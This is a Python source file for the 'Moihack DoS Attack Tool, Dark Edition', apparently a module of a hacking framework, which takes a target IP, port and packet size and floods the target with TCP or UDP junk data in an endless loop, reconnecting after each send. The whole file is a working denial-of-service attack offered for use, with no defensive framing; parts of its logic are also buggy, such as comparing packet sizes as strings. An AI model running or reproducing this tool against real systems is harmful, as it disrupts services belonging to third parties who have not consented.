#start modules import
import socket
import random
import sys
from Core.Tools.Tools import core_get_parameters
#end modules import

f = open("Groups/DoS/data_log", "w")
temp = sys.stdout
sys.stdout = f

__version__='Dark Edition'
print('Moihack DoS Attack Tool', __version__)
print('Welcome to Moihack DoS Attack Tool')

print("""\n##     ##  #######  #### ##     ##    ###     ######  ##    ##
###   ### ##     ##  ##  ##     ##   ## ##   ##    ## ##   ##
#### #### ##     ##  ##  ##     ##  ##   ##  ##       ##  ##
## ### ## ##     ##  ##  ######### ##     ## ##       #####
##     ## ##     ##  ##  ##     ## ######### ##       ##  ##
##     ## ##     ##  ##  ##     ## ##     ## ##    ## ##   ##
##     ##  #######  #### ##     ## ##     ##  ######  ##    ## \n""")

parameters = core_get_parameters()

#IP specific commands
IP = parameters['ip']

#Port specific commands
print('Please specify the port you wish to attack.\nDefault Port is 80.')
print('Some common port numbers are:')
print('Service Name: FTP\tTelnet\tHTTP\tNetBIOS')
print('Port Number:  21 \t23\t80\t137')
Port = parameters['port']
if Port=="" or Port=='80':
    Port=int('80')
    print('Will attack HTTP service on', IP)
else:
    Port=int(Port)
    print('Port specified.')

#Packet Size specific commands
Size= parameters['packet_size']
if Size=="" or Size=='64':
      Size=int('64')
      print('Using default packet size.')
elif Size=='128':
     Size=int('128')
     print('Size set to max.')
elif Size>'128':
    Size=int('128')
    print('Size set to max instead.')
else:
    Size=int(Size)
    print('Packet size specified.')
RaP=parameters['random_size']
if RaP=='yes' or RaP=='YES' or RaP=="":
    print('Random Packet Creation enabled.')
else:
    print('Random Packet Creation disabled')
#Packet Creation specific commands

Data="qwertyuiopasdfghjklzxcvbnm0123456789~!@#$%^&*()+=`;?.,<>\|{}[]"

#Protocol Selection and Socket Creation specific commands

adr=(IP, Port)
Protocol = input('Select Protocol Of Internet Protocol Suite[TCP/UDP]\nDefault Protocol is TCP\n')
if Protocol =='TCP' or Protocol == 'tcp' or Protocol == "":
    print('Using TCP Protocol.')
    def attack():
        ready=(input('Ready to launch DoS Attack?\nIf ready press enter or type yes.\nIf not type no:\n'))
        if ready =='yes' or ready =='YES' or ready =="":
            Sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            Sock.connect(adr)
            while True:
                global RaP

                if RaP=='yes' or RaP=='YES' or RaP=="":
                    Bytes=(Data*(random.randrange(1,64)))
                    BytesEnc=str.encode(Bytes)
                    Sock.sendall(BytesEnc)
                    print('Flooding {0} in port {1} with {2} bytes of data'.format(IP, Port, sys.getsizeof(BytesEnc)))
                else:
                    Bytes=(Data*Size)
                    BytesEnc=str.encode(Bytes)
                    Sock.sendall(BytesEnc)
                    print('Flooding {0} in port {1} with {2} bytes of data'.format(IP, Port, sys.getsizeof(BytesEnc)))
                if socket.error:
                    Sock.shutdown(socket.SHUT_RDWR)
                    Sock.close
                    del Sock
                    Sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    Sock.connect(adr)

                    if RaP=='yes' or RaP=='YES' or RaP=="":
                        Bytes=(Data*(random.randrange(64,128)))
                        BytesEnc=str.encode(Bytes)
                        Sock.sendall(BytesEnc)
                        print('Flooding {0} in port {1} with {2} bytes of data'.format(IP, Port, sys.getsizeof(BytesEnc)))
                    else:
                        Bytes=(Data*Size)
                        BytesEnc=str.encode(Bytes)
                        Sock.sendall(BytesEnc)
                        print('Flooding {0} in port {1} with {2} bytes of data'.format(IP, Port, sys.getsizeof(BytesEnc)))

        elif ready == 'no' or ready == 'NO':
            print('When you are ready type yes or press Enter:')
            attack()

        else:
            print('Thank you for trying Moihack DoS attack tool!!!')
            f.close()
            sys.exit
    attack()
else:
    Sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    print('Using UDP Protocol.')
    def attack():
        ready=(input('Ready to launch DoS Attack?\nIf ready press enter or type yes.\nIf not type no:\n'))
        if ready =='yes' or ready =='YES' or ready == "":
            Sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            Sock.connect(adr)
            while True:
                global RaP

                if RaP=='yes' or RaP=='YES' or RaP=="":
                    Bytes=(Data*(random.randrange(1,64)))
                    BytesEnc=str.encode(Bytes)
                    Sock.sendall(BytesEnc)
                    print('Flooding {0} in port {1} with {2} bytes of data'.format(IP, Port, sys.getsizeof(BytesEnc)))
                else:
                    Bytes=(Data*Size)
                    BytesEnc=str.encode(Bytes)
                    Sock.sendall(BytesEnc)
                    print('Flooding {0} in port {1} with {2} bytes of data'.format(IP, Port, sys.getsizeof(BytesEnc)))
                if socket.error:
                    Sock.shutdown(socket.SHUT_RDWR)
                    Sock.close
                    del Sock
                    Sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                    Sock.connect(adr)

                    if RaP=='yes' or RaP=='YES' or RaP=="":
                        Bytes=(Data*(random.randrange(64,128)))
                        BytesEnc=str.encode(Bytes)
                        Sock.sendall(BytesEnc)
                        print('Flooding {0} in port {1} with {2} bytes of data'.format(IP, Port, sys.getsizeof(BytesEnc)))
                    else:
                        Bytes=(Data*Size)
                        BytesEnc=str.encode(Bytes)
                        Sock.sendall(BytesEnc)
                        print('Flooding {0} in port {1} with {2} bytes of data'.format(IP, Port, sys.getsizeof(BytesEnc)))

        elif ready == 'no' or ready == 'NO':
            print('When you are ready type yes or press Enter:')
            attack()

        else:
            print('Thank you for trying Moihack DoS attack tool!!!')
            f.close()
            sys.exit
    attack()










